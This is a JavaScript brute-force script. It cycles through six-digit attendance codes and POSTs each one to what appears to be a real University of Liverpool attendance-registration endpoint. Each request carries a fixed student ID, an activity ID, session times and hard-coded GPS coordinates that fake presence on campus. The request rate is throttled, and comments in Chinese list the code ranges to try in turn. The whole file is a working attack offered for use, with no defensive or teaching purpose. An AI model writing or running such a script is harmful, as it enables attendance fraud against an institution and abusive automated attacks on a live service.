async function sendRequests() {
  // let i = 0; i <= 99999; i++ 好像没有0开头的
  // let i = 100000; i <= 149999; i++
  // let i = 150000; i <= 199999; i++
  // let i = 200000; i <= 249999; i++
  // let i = 250000; i <= 299999; i++
  // let i = 300000; i <= 349999; i++
  // let i = 350000; i <= 399999; i++
  // let i = 400000; i <= 449999; i++
  // let i = 450000; i <= 499999; i++
  // let i = 500000; i <= 549999; i++
  // let i = 550000; i <= 599999; i++
  // let i = 600000; i <= 649999; i++
  // let i = 650000; i <= 699999; i++
  // let i = 700000; i <= 749999; i++
  // let i = 750000; i <= 799999; i++
  // let i = 800000; i <= 849999; i++
  // let i = 850000; i <= 899999; i++
  // let i = 900000; i <= 949999; i++
  // let i = 950000; i <= 999999; i++
  for (let i = 100000; i <= 149999; i++) {
    let attCodeInputValue = i.toString().padStart(6, "0");

    try {
      const response = await fetch(
        "https://timetables.liverpool.ac.uk/services/register-attendance-student",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            // 添加其他必要的头信息
          },
          // 此处做替换
          body: `attCodeInput=${attCodeInputValue}&uniqueId=164c3224791bcd36b4c0eaa6d04c4fcd&actId=F0C567914F31D34BA0A5AF0C8941DE04&attStart=05%2F03%2F2024+12%3A00&attEnd=05%2F03%2F2024+13%3A15&location=53.41000026923014%2C-2.9582338422452295`,
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error("Error:", error);
    }

    await new Promise((resolve) => setTimeout(resolve, 100)); 
  }
}

sendRequests();
